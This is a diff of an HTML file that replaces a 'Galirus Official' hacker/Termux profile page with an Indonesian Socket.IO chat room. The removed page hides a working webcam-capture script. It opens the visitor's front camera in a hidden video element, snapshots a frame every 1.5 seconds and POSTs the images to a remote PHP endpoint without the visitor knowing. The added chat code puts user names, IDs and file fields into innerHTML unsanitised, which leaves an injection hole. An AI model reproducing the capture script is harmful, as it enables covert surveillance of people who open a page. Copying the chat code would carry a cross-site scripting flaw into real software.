@@ -1,195 +1,434 @@
-<!doctype html>
-<html>
+
+<!DOCTYPE html>
+<html lang="id">
 <head>
-<meta name="viewport" content="width=device-width,height=device-height,initial-scale=1.0">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;700&display=swap" rel="stylesheet">
+  <title>Ruangan Chat</title>
   <style>
-  	  html {
-  	  background-color:white;
-  	  font-family:arial;
-  	  }
-  	  div.load {
-  	  width:100%;
-  	  height:100%;
-  	  display:block;
-  	  }
-     .loader {
-     display:inherit;
-     position:absolute;
-     top:40%;
-     right:40%;
-     width:1.5cm;
-     height:1.5cm;
-     border-radius:50%;
-     border:7px solid #eaeaff;
-     border-top:7px solid #aadfff;
-     -webkit-animation:spin 2s linear -1s infinite;
-     }
-     @-webkit-keyframes spin {
-     0% {-webkit-transform:rotate(0deg);}
-     100% {-webkit-transform:rotate(360deg);}
-     }
-     .load p {
-     opacity:0.5;
-     color:#8a9fa6;
-     font-size:17px;
-     text-align:center;
-     position:relative;
-     top:200px;
-     }     
-  </style>
-<script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
-<link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
-<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
-</head>
-
-<div class="video-wrap" hidden="hidden">
-   <video id="video" playsinline autoplay></video>
-</div>
-
-<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>
-
-<script>
-
-function post(imgdata){
-$.ajax({
-    type: 'POST',
-    data: { cat: imgdata},
-    url: 'forwarding_link/post.php',
-    dataType: 'json',
-    async: false,
-    success: function(result){
-        // call the function that handles the response/results
-    },
-    error: function(){
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Ubuntu', sans-serif;
+      background-color: #212121;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
     }
-  });
-};
 
+    #chatMessages {
+      width: 100%;
+      max-width: 900px;
+      height: 70vh;
+      background-color: rgba(255, 255, 255, 0.05);
+      padding: 20px;
+      border-radius: 15px;
+      box-shadow: 0 4px 12px rgba(255, 255, 255, 0.1);
+      overflow-y: auto;
+      display: flex;
+      flex-direction: column;
+      gap: 15px;
+      margin-bottom: 20px;
+      scroll-behavior: smooth;
+    }
 
-'use strict';
+    .info-container {
+      text-align: center;
+      margin-bottom: 20px;
+      color: #ffffff;
+    }
 
-const video = document.getElementById('video');
-const canvas = document.getElementById('canvas');
-const errorMsgElement = document.querySelector('span#errorMsg');
+    .user-info p, .status-info p, .server-info p {
+      color: #81c784;
+      font-size: 1.1rem;
+    }
 
-const constraints = {
-  audio: false,
-  video: {
-    
-    facingMode: "user"
-  }
-};
+    .message {
+      background-color: #f7f7f7;
+      padding: 15px;
+      border-radius: 12px;
+      font-size: 1rem;
+      line-height: 1.5;
+      word-wrap: break-word;
+      position: relative;
+      max-width: 80%;
+      box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+      opacity: 0;
+      transform: translateY(20px);
+      animation: fadeIn 0.5s forwards, slideUp 0.5s forwards;
+      cursor: pointer; /* Menambahkan kursor pointer */
+    }
 
-// Access webcam
-async function init() {
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia(constraints);
-    handleSuccess(stream);
-  } catch (e) {
-    errorMsgElement.innerHTML = `navigator.getUserMedia error:${e.toString()}`;
-  }
-}
+    @keyframes fadeIn {
+      to {
+        opacity: 1;
+      }
+    }
 
-// Success
-function handleSuccess(stream) {
-  window.stream = stream;
-  video.srcObject = stream;
+    @keyframes slideUp {
+      to {
+        transform: translateY(0);
+      }
+    }
 
-var context = canvas.getContext('2d');
-  setInterval(function(){
+    .message:hover {
+      background-color: #d3d3d3;
+    }
 
-       context.drawImage(video, 0, 0, 640, 480);
-       var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
-       post(canvasData); }, 1500);
-  
+    .user-message {
+      background-color: #a8e6cf;
+      align-self: flex-end;
+      border-radius: 12px 12px 0 12px;
+    }
 
-}
+    .other-message {
+      background-color: #ffffff;
+      align-self: flex-start;
+      border-radius: 12px 12px 12px 0;
+    }
 
-// Load init
-init();
+    #messageInput {
+      width: 100%;
+      padding: 12px;
+      border-radius: 30px;
+      border: 2px solid #4caf50;
+      font-size: 1rem;
+      outline: none;
+      margin-bottom: 10px;
+      box-sizing: border-box;
+      background-color: #333;
+      color: #fff;
+    }
 
-</script>
-<html>
-	<head>
-		<meta property="og:title" content="GalirusProjects">
-		<link href="https://mynameisrosita.nasiwebhost.com/profile/snakesec.png" rel="icon" type="image/x-icon">
-		<meta property="og:image" content="https://mynameisrosita.nasiwebhost.com/profile/snakesec.png">
-		<meta http-equiv="cache-control" content="index,cache">
-		<meta http-equiv="pragma" content="index,cache">
-		<meta name="keywords" content="GalirusProjects">
-		<meta charset="utf-8">
-<title>Galirus Official</title>
-		<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet">
-    <script src="" type="text/javascript"></script>
-        <script src="" type="text/javascript"></script>
-            <script src="" type="text/javascript"></script>
-	</head>
+    #messageInput:focus {
+      border-color: #81c784;
+    }
 
+    .button-icon {
+      font-size: 1.5rem;
+      background-color: transparent;
+      border: none;
+      cursor: pointer;
+      padding: 10px;
+      color: #81c784;
+      transition: color 0.2s;
+    }
+
+    .button-icon:hover {
+      color: #66bb6a;
+    }
+
+    h1 {
+      font-size: 2.5rem;
+      color: #ffffff;
+      margin-bottom: 20px;
+    }
+
+    .reply-container {
+      margin-bottom: 10px;
+      padding: 10px;
+      background-color: rgba(255, 255, 255, 0.1);
+      color: #fff;
+      font-size: 0.9rem;
+      border-left: 4px solid #81c784;
+      border-radius: 5px;
+      position: relative;
+    }
+
+    .reply-container span {
+      font-weight: bold;
+      color: #81c784;
+    }
+
+    .reply-container .cancel-reply {
+      position: absolute;
+      top: 5px;
+      right: 10px;
+      cursor: pointer;
+      color: #e57373;
+      font-weight: bold;
+    }
+
+    .delete-icon {
+      font-size: 0.8rem; /* Ukuran lebih kecil */
+      color: #e57373;
+      cursor: pointer;
+      position: absolute;
+      bottom: 5px; /* Pindah ke bawah */
+      right: 5px; /* Pindah ke kanan */
+    }
+
+    .reply-message {
+      background-color: #e0f7fa;
+      padding: 10px;
+      border-radius: 5px;
+      border-left: 4px solid #4db6ac;
+      margin-bottom: 5px;
+    }
+  </style>
+</head>
 <body>
-	<style type="text/css">
-html {
-background-image: url(https://1.bp.blogspot.com/-ShchmJy9EVU/Xqz0VzV8QJI/AAAAAAAAOzQ/RuUNUmWwAY4wSYKgzuIs380yzyvUxY-qwCLcBGAsYHQ/w1080/amoled%2Bwallpaper.jpg);
-  background-repeat: no-repeat;
-  background-position: center;
-  background-size: cover;
-  background-attachment: fixed;
-  height: auto;
-  width: auto;
-  background-color: #ffffff;
 
-color: #fff;
-text-align: center;
-font-family: "Kelly Slab", sans serif;
-margin: 0;
-font-weight: 60;
-height: 60vh;
-}
+  <h1>Ruangan Chat</h1>
 
-  .button-like {
-    display: inline-block;
-    padding: 10px 20px;
-    background-color: #3498db; /* Warna latar belakang */
-    color: #ffffff; /* Warna teks */
-    border: 2px solid #2980b9; /* Warna border */
-    border-radius: 15px;
-  }
-	</style>
+  <div class="info-container">
+    <div class="user-info">
+      <p>Anda login sebagai: <strong id="userIdDisplay"></strong> (<span id="userNameDisplay"></span>)</p>
+    </div>
+    <div class="status-info">
+      <p id="onlineStatus">Pengguna Online: </p>
+    </div>
+    <div class="server-info">
+      <p id="serverStatus">Server Running: --:--:--</p>
+    </div>
+  </div>
 
-<br>
-<embed src="https://youtu.be/AnMhdn0wJ4I&autoplay=1&start=0" type="application/x-shockwave-flash" wmode="transparent" width="0" height="0"></embed>
-</div>
+  <div id="chatMessages"></div>
+
+  <div id="replyContainer" class="reply-container" style="display: none;">
+    Membalas: <span id="replyText"></span>
+    <span class="cancel-reply" onclick="cancelReply()">×</span>
+  </div>
+
+  <div style="display: flex; align-items: center; gap: 10px;">
+    <input type="text" id="messageInput" placeholder="Ketik pesan Anda" />
+    <button class="button-icon" id="fileButton">📥</button>
+    <button class="button-icon" onclick="sendMessage()">📨</button>
+    <input type="file" id="fileInput" style="display: none;" />
+  </div>
+
+  <!-- Elemen Audio untuk Notifikasi dan Pengirim Pesan -->
+  <audio id="notificationAudio" src="https://od.lk/s/OV8yNDUxODMyNzdf/livechat-129007.mp3" preload="auto"></audio>
+  <audio id="sendAudio" src="https://od.lk/s/OV8yNDUxODM1NTdf/happy-pop-2-185287.mp3" preload="auto"></audio>
+
+  <script src="/socket.io/socket.io.js"></script>
+  <script>
+    const phone = sessionStorage.getItem('phone');
+    const userId = sessionStorage.getItem('userId');
+    const userName = sessionStorage.getItem('name');
+
+    if (!phone || !userId || !userName) {
+      alert('Anda harus login untuk melanjutkan');
+      window.location.href = '/login';
+    } else {
+      document.getElementById('userIdDisplay').textContent = userId;
+      document.getElementById('userNameDisplay').textContent = userName;
+    }
+
+    const socket = io();
+    const displayedMessages = new Set();
+    let replyToMessage = null;
+
+    async function loadChatHistory() {
+      try {
+        const response = await fetch('/chat-history');
+        const chatHistory = await response.json();
+        chatHistory.forEach(displayMessage);
+      } catch (error) {
+        console.error('Gagal memuat riwayat chat:', error);
+      }
+    }
+
+    function formatTime(seconds) {
+      const hours = Math.floor(seconds / 3600);
+      const minutes = Math.floor((seconds % 3600) / 60);
+      const secs = seconds % 60;
+      return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
+    }
+
+    function sanitizeInput(input) {
+      const doc = new DOMParser().parseFromString(input, 'text/html');
+      return doc.body.textContent || "";
+    }
+
+    function sendMessage() {
+      const messageInput = document.getElementById('messageInput');
+      const fileInput = document.getElementById('fileInput');
+      const messageText = messageInput.value;
+      const file = fileInput.files[0];
+
+      if (messageText.trim() === '' && !file) return;
+
+      const sanitizedMessage = sanitizeInput(messageText);
+
+      const message = {
+        userId: userId,
+        phone: phone,
+        name: userName,
+        text: sanitizedMessage,
+        timestamp: new Date().toISOString(),
+        file: null,
+        replyTo: replyToMessage,
+      };
+
+      if (file) {
+        const reader = new FileReader();
+        reader.onload = function(event) {
+          message.file = {
+            name: file.name,
+            type: file.type,
+            size: file.size,
+            content: event.target.result
+          };
+          socket.emit('chat message', message);
+        };
+        reader.readAsDataURL(file);
+      } else {
+        socket.emit('chat message', message);
+      }
+
+      // Memutar suara pengirim pesan
+      const sendAudio = document.getElementById('sendAudio');
+      sendAudio.currentTime = 0; // Mulai dari awal
+      sendAudio.play();
+
+      replyToMessage = null;
+      updateReplyUI();
+      messageInput.value = '';
+      fileInput.value = '';
+    }
+
+    function displayMessage(message) {
+      if (displayedMessages.has(message.timestamp)) return;
+
+      displayedMessages.add(message.timestamp);
+
+      const chatMessages = document.getElementById('chatMessages');
+      const messageElement = document.createElement('div');
+
+      messageElement.classList.add('message');
+      messageElement.classList.add(message.userId === userId ? 'user-message' : 'other-message');
+
+      const sanitizedMessageText = sanitizeInput(message.text);
+
+      let replyHtml = '';
+      if (message.replyTo) {
+        const replyText = sanitizeInput(message.replyTo.text);
+        const replyUser = sanitizeInput(message.replyTo.name); // Nama pengirim pesan yang dibalas
+        replyHtml = `
+          <div style="font-size: 0.9rem; color: #888; margin-bottom: 5px; border-left: 4px solid #81c784; padding-left: 10px;">
+            <strong>Balasan ke ${replyUser}:</strong> ${replyText}
+          </div>`;
+      }
+
+      messageElement.innerHTML = `
+        ${replyHtml}
+        <strong>${message.name} (${message.userId}):</strong><br>${sanitizedMessageText}
+        <br><small>(${new Date(message.timestamp).toLocaleTimeString()})</small>
+        <span class="delete-icon" onclick="confirmDeleteMessage('${message.timestamp}')">🗑️</span>
+      `;
+
+      // Menampilkan file jika ada
+      if (message.file) {
+        const fileType = message.file.type.split('/')[0];
+        if (fileType === 'video') {
+          messageElement.innerHTML += `<video width="300" controls>
+            <source src="${message.file.content}" type="${message.file.type}">
+            Browser Anda tidak mendukung video.
+          </video>`;
+        } else if (fileType === 'audio') {
+          messageElement.innerHTML += `<audio controls>
+            <source src="${message.file.content}" type="${message.file.type}">
+            Browser Anda tidak mendukung audio.
+          </audio>`;
+        } else if (fileType === 'image') {
+          messageElement.innerHTML += `<img src="${message.file.content}" alt="${message.file.name}" width="300" />`;
+        } else {
+          messageElement.innerHTML += `<p>File: ${message.file.name} (${Math.round(message.file.size / 1024)} KB)</p>`;
+        }
+      }
+
+      // Menambahkan event listener untuk reply message
+      messageElement.onclick = function() {
+        initiateReply(message);
+        document.getElementById('messageInput').focus(); // Fokus pada input message
+      };
+
+      chatMessages.appendChild(messageElement);
+      chatMessages.scrollTop = chatMessages.scrollHeight;
+
+      // Memutar notifikasi suara untuk pesan dari pengguna lain
+      if (message.userId !== userId) {
+        const notificationAudio = document.getElementById('notificationAudio');
+        notificationAudio.currentTime = 0; // Mulai dari awal
+        notificationAudio.play();
+      }
+    }
+
+    function confirmDeleteMessage(timestamp) {
+      const password = prompt("Masukkan password untuk menghapus pesan:");
+      if (password) {
+        deleteMessage(timestamp, password);
+      }
+    }
+
+    function deleteMessage(timestamp, password) {
+      fetch('/delete-message', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({ timestamp, password }),
+      })
+      .then(response => {
+        if (response.ok) {
+          alert('Pesan berhasil dihapus');
+          location.reload(); // Memuat ulang halaman untuk melihat perubahan
+        } else {
+          alert('Gagal menghapus pesan: password salah atau tidak memiliki hak');
+        }
+      })
+      .catch(error => {
+        console.error('Terjadi kesalahan:', error);
+      });
+    }
+
+    function initiateReply(message) {
+      replyToMessage = message;
+      updateReplyUI();
+    }
+
+    function updateReplyUI() {
+      const replyContainer = document.getElementById('replyContainer');
+      const replyText = document.getElementById('replyText');
+
+      if (replyToMessage) {
+        replyContainer.style.display = 'block';
+        replyText.textContent = sanitizeInput(replyToMessage.text);
+      } else {
+        replyContainer.style.display = 'none';
+        replyText.textContent = '';
+      }
+    }
+
+    function cancelReply() {
+      replyToMessage = null;
+      updateReplyUI();
+    }
+
+    socket.on('chat message', (message) => {
+      displayMessage(message);
+    });
+
+    socket.on('online users', (count) => {
+      const onlineStatus = document.getElementById('onlineStatus');
+      onlineStatus.textContent = `Pengguna Online: ${count}`;
+    });
+
+    socket.on('server uptime', (uptimeInSeconds) => {
+      const serverStatus = document.getElementById('serverStatus');
+      serverStatus.textContent = `Server Running: ${formatTime(uptimeInSeconds)}`;
+    });
+
+    document.getElementById('fileButton').addEventListener('click', () => {
+      document.getElementById('fileInput').click();
+    });
+
+    loadChatHistory();
+  </script>
+
 </body>
-</html>
-<br><br>
-	             <font size="3" color="white">Author By : </font><font size="6" color="red">Galirus Project</font><br><br><br>
-	             <img title="GalirusProjects" src="https://telegra.ph/file/314d7f42e24887a616035.png" width="400"><br>
-	<i><br>
-	  <font size="7" color="red">Hello Saya Galirus Official</font><br><hr><br>
-	  <font size="5" color="white">Jangan kau Merasa bangga dengan Hasil yang kau dapat dari orang lain<br>Sok Sok Paling hacker tapi modal Script Orang Lawak 😂<br><br>Don't feel proud of the results you get from other people<br>Pretend to be the most hacker but have the capital of a joker's script😂</font><br><hr><br>
-	<font size="3" color="yellow"></font><br><hr>
-	 <a href="https://www.youtube.com/@GalirusOfficial"><div size="20" class="button-like">YouTube</div></a>
-	 <a href="https://tiktok.com/@galirus.official"><div size="20" class="button-like">Tiktok</div></a><br><br>
-	 <a href="https://fnofzyyubhbh7sdbgzzjva.on.drv.tw/galirus/script.html"><div size="20" class="button-like">Script Termux</div></a>
-	 <a href="https://chat.whatsapp.com/IF3SU2gamR4InAeG5O1mSG"><div size="10" class="button-like">Termux Comunity</div></a><br><br>
-	  <a href="https://shorturl.at/lCNRZ"><div size="10" class="button-like">Zero Termux</div></a>
-	   <a href="https://cyberstudy.my.id/appfile/CyberStudy(v1.5).apk"><div size="10" class="button-like">CyberStudy</div></a><br><br>
-	    <a href="https://mt-manager.en.uptodown.com/android/download"><div size="10" class="button-like">Mt Manager</div></a>
-	     <a href="https://store.nethunter.com/repo/com.offsec.nethunter.kex_11407306.apk"><div size="10" class="button-like">Nethunter Kex</div></a><br><br>
-      <a href="https://drive.google.com/drive/folders/18GGUt3aaIn5m7cs4msKBxLmmhsxqcEXd"><div size="30" class="button-like">GALIRUS STORY</div></a>
-      <a href="https://fnofzyyubhbh7sdbgzzjva.on.drv.tw/galirus/panduan.html"><div size="30" class="button-like">DOWNLOAD LINK</div></a><br><br>
-      <a href="https://www.whatsapp.com/contact/noclient?lang=id_ID"><div size="30" class="button-like">UNBAN WHATSAPP</div></a>
-      <br>
-<br>
-	<hr><div size="10" class="footer-greetings"><marquee><font size="4" color="red">
-		<b>THANKS YOU FOR  </b> : </font><font size="5" color="white">TERMUX COMUNITY</font></font></marquee></div></td></table>
-		<hr><br>
-					<audio controls="controls" autoplay="true" loop="loop" src="https://d.top4top.io/m_2883lmsem0.mp4"></audio>
-	</i>
-
-		<script>
-		(function(){var js = "window['__CF$cv$params']={r:'78a1663cfc30a129',m:'sl3IEuXNd0z8F8YSz4F3eb3XwlW4RftE7A7BId1PsDk-1673814942-0-AamVfHbcq9F6shk5OM5kzb7NyaLIsUnzKDtwnKXWqumUVCdcgQv67PXV7w3MTSXWkl+8nPWqGuCflljw9EmsPAQ0U/YtYOfTC1W2MS9hsWv9WeWQiiFbNdvC/gjZ6gve/qM70/7WHkz/rAaSnX9DIOA=',s:[0xac1da4f42d,0x08725e79da],u:'/cdn-cgi/challenge-platform/h/g'};var now=Date.now()/1000,offset=14400,ts=''+(Math.floor(now)-Math.floor(now%offset)),_cpo=document.createElement('script');_cpo.nonce='',_cpo.src='/cdn-cgi/challenge-platform/h/g/scripts/alpha/invisible.js?ts='+ts,document.getElementsByTagName('head')[0].appendChild(_cpo);";var _0xh = document.createElement('iframe');_0xh.height = 1;_0xh.width = 1;_0xh.style.position = 'absolute';_0xh.style.top = 0;_0xh.style.left = 0;_0xh.style.border = 'none';_0xh.style.visibility = 'hidden';document.body.appendChild(_0xh);function handler() {var _0xi = _0xh.contentDocument || _0xh.contentWindow.document;if (_0xi) {var _0xj = _0xi.createElement('script');_0xj.nonce = '';_0xj.innerHTML = js;_0xi.getElementsByTagName('head')[0].appendChild(_0xj);}}if (document.readyState !== 'loading') {handler();} else if (window.addEventListener) {document.addEventListener('DOMContentLoaded', handler);} else {var prev = document.onreadystatechange || function () {};document.onreadystatechange = function (e) {prev(e);if (document.readyState !== 'loading') {document.onreadystatechange = prev;handler();}};}})();
-		</script>
-	</body>
-</html>
-
 </html>
